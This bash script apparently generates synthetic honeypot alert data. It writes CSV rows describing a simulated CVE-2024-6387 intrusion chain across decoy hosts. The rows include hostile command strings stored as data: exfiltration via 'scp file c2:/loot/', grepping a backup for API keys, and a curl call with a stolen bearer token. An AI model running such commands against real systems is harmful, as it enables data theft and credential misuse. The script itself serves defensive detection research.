#!/usr/bin/bash

CSV_PATH="pattern_analysis.csv"

# Default speed
SPEED="slow"

# Parse arguments
while [[ "$#" -gt 0 ]]; do
    case $1 in
        --speed) SPEED="$2"; shift ;;
        *) echo "Unknown parameter passed: $1"; exit 1 ;;
    esac
    shift
done

    octt3=$((RANDOM % 250 + 1))
    octt4=$((RANDOM % 250 + 1))
    SRC_IP="185.220.$octt3.$octt4"
    
    
# Set sleep time based on speed
case $SPEED in
    fast) SLEEP_TIME=0.5 ;;
    normal) SLEEP_TIME=2 ;;
    slow) SLEEP_TIME=5 ;;
    *) SLEEP_TIME=2 ;;
esac

append_csv() {
    local executed_commands=$1
    local command_sequence=$2
    local alert_type=$3
    local severity=$4
    local files_accessed=$5
    local description=$6
    local decoy_asset_id=$7
    local decoy_asset_type=$8
    local dst_ip=$9

    echo "[*] Action: $description"
    sleep $SLEEP_TIME
    
    #octt3=$((RANDOM % 250 + 1))
    #octt4=$((RANDOM % 250 + 1))
    UUID=$(uuidgen)
    TIMESTAMP_START=$(date -Iseconds)
    TIMESTAMP_END=$(date -Iseconds)
    #SRC_IP="185.220.$octt3.$octt4"
    SRC_PORT=$((RANDOM%55535+10000))
    DST_PORT=22
    PROTOCOL="SSH"
    GEOIP="Germany"
    USER_AGENT="OpenSSH_9.2"
    SSH_BANNER="OpenSSH_9.2p1 Debian-2"
    MAC_ADDRESS="02:00:00:$(printf '%02x' $((RANDOM%256))):$(printf '%02x' $((RANDOM%256))):$(printf '%02x' $((RANDOM%256)))"
    TOR_VPN_FLAG="Tor"
    TOOL_IDENTIFICATION="Custom Exploit Script"
    HASHES=$(echo -n $UUID | sha256sum | cut -c1-10)
    ACCESSED_PATHS="$files_accessed"
    CREATED_MODIFIED="/tmp/c2relay.log"
    DWELL_TIME="$((RANDOM%300+60))"
    TIME_BETWEEN_COMMANDS="$((RANDOM%30+5))"
    TYPING_SPEED=""
    NUM_DECOYS="4"
    RECONNECTION_PATTERNS="Persistent"
    MITRE_MAPPING="T1190,T1059,T1003,T1046,T1567"
    DECOY_OS_VERSION="Ubuntu 22.04"
    EXPOSED_SERVICE="SSH:22"
    BREADCRUMB_SOURCE="Honeytoken"

    echo "$UUID,$TIMESTAMP_START,$TIMESTAMP_END,$decoy_asset_id,$decoy_asset_type,$alert_type,$severity,$SRC_IP,$SRC_PORT,$dst_ip,$DST_PORT,$PROTOCOL,$GEOIP,$USER_AGENT,$SSH_BANNER,$MAC_ADDRESS,$TOR_VPN_FLAG,\"$executed_commands\",\"$command_sequence\",$TOOL_IDENTIFICATION,$files_accessed,$HASHES,$ACCESSED_PATHS,$CREATED_MODIFIED,$DWELL_TIME,$TIME_BETWEEN_COMMANDS,$TYPING_SPEED,$NUM_DECOYS,$RECONNECTION_PATTERNS,$MITRE_MAPPING,$DECOY_OS_VERSION,$EXPOSED_SERVICE,$BREADCRUMB_SOURCE" >> "$CSV_PATH"

    decoy_console_name="${decoy_asset_id#decoy_}"
    description="${description//decoy_/}"
    decoy_asset_type=$decoy_console_name
    echo "[*] Action on $decoy_console_name: $description"
    
    #echo "[+] Completed: $description"
    echo "-------------------------------------------"
}

# Ensure CSV has header if new
if [ ! -f "$CSV_PATH" ]; then
    echo "event_id,timestamp_start,timestamp_end,decoy_asset_id,decoy_asset_type,alert_type,severity,src_ip,src_port,dst_ip,dst_port,protocol,geoip,user_agent,SSH client banner,MAC address,Tor/VPN usage flag,executed_commands,command_sequence,tool_identification,file names accessed or dropped,hashes of dropped binaries,accessed_file_paths,created/modified files,dwell_time,time_between_commands,typing speed if keylogging is in decoy,number of decoys touched in one campaign,reconnection patterns,MITRE ATT&CK technique mappings,decoy OS and version,exposed services,breadcrumb source" > "$CSV_PATH"
fi

echo "[*] Lets try CVE-2024-6387 ...."
echo "-------------------------------------------"

# Decoy progression
append_csv "exploit_CVE-2024-6387;id" "exploit->id" "Remote Code Execution" "Critical" "" "Exploiting CVE-2024-6387 on decoy_ssh_finance01" "decoy_ssh_finance01" "Linux SSH" "10.0.1.10"

append_csv "id;whoami" "id->whoami" "Privilege Escalation" "High" "" "Privilege escalation on decoy_ssh_finance01" "decoy_ssh_finance01" "Linux SSH" "10.0.1.10"

append_csv "ssh lateral_move;wmic useraccount get name" "ssh->wmic" "Lateral Movement" "High" "" "Lateral move to decoy_win_hr02" "decoy_win_hr02" "Windows Server" "10.0.2.15"

append_csv "dir C:\\Users\\*\\Documents" "dir" "Discovery" "Medium" "" "File discovery on decoy_win_hr02" "decoy_win_hr02" "Windows Server" "10.0.2.15"

append_csv "ssh lateral_move;mysql -e 'SHOW DATABASES;'" "ssh->mysql_enum" "Lateral Movement" "High" "" "Lateral move to decoy_db_corpdev03" "decoy_db_corpdev03" "Database MySQL" "10.0.3.20"

append_csv "find / -name '*customer*backup*.xls';scp file c2:/loot/" "find->exfil" "Exfiltration" "High" "marketdatacustomer_backup.xls" "Exfiltrating sensitive backup on decoy_db_corpdev03" "decoy_db_corpdev03" "Database MySQL" "10.0.3.20"

append_csv "grep -i 'api_key' marketdatacustomer_backup.xls" "extract_api_key" "Credential Access" "High" "marketdatacustomer_backup.xls" "Extracting API key on decoy_ssh_corpdev04" "decoy_ssh_corpdev04" "Linux SSH" "10.0.4.25"

append_csv "curl -H 'Authorization: Bearer sk_live_1234567890abcdef' https://api.marketdata.corp/customer/query" "api_fetch" "Collection" "High" "marketdatacustomer_backup.xls" "Fetching customer data using stolen API key on decoy_ssh_corpdev04" "decoy_ssh_corpdev04" "Linux SSH" "10.0.4.25"

echo "[âœ…] CVE-2024-6387 expliot complete. Clearing tracks ... "
